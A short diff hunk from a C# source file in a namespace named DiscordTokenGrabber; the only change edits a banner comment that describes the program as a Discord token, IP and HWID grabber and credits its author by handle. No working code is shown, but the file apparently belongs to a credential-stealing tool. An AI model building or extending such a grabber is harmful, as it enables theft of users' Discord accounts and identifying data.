@@ -6,7 +6,7 @@ using System.Collections.Generic;
 
 namespace DiscordTokenGrabber
 {
-    /*  | Discord Token, IP Grabber, Hwid Grabber     |
+    /*  | Discord Token, IP Grabber % Hwid Grabber    |
      *  | Coded by xanthe.#1337                       | 
      *  | [C#, Python, and Web developer (HTML, CSS)] |
      *  | ------------------------------------------- |
